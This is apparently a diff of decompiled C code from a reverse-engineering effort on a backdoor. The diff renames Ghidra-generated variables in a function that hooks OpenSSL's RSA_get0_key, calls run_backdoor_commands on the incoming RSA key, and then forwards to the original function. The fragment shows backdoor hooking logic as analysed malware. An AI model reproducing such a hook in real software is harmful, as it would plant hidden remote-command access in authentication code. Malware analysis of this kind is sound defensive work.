@@ -14,19 +14,19 @@
 void hook_RSA_get0_key(RSA *r,BIGNUM **n,BIGNUM **e,BIGNUM **d)
 
 {
-  pfn_RSA_get0_key_t UNRECOVERED_JUMPTABLE;
-  BOOL local_1c;
+  pfn_RSA_get0_key_t orig_RSA_get0_key;
+  BOOL call_orig;
   
   if (((global_ctx != (global_context_t *)0x0) &&
       (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
-     (UNRECOVERED_JUMPTABLE = global_ctx->imported_funcs->RSA_get0_key_null,
-     UNRECOVERED_JUMPTABLE != (pfn_RSA_get0_key_t)0x0)) {
+     (orig_RSA_get0_key = global_ctx->imported_funcs->RSA_get0_key_null,
+     orig_RSA_get0_key != (pfn_RSA_get0_key_t)0x0)) {
     if (r != (RSA *)0x0) {
-      run_backdoor_commands(r,global_ctx,&local_1c);
+      run_backdoor_commands(r,global_ctx,&call_orig);
     }
                     /* WARNING: Could not recover jumptable at 0x0010a394. Too many branches */
                     /* WARNING: Treating indirect jump as call */
-    (*UNRECOVERED_JUMPTABLE)(r,n,e,d);
+    (*orig_RSA_get0_key)(r,n,e,d);
     return;
   }
   return;
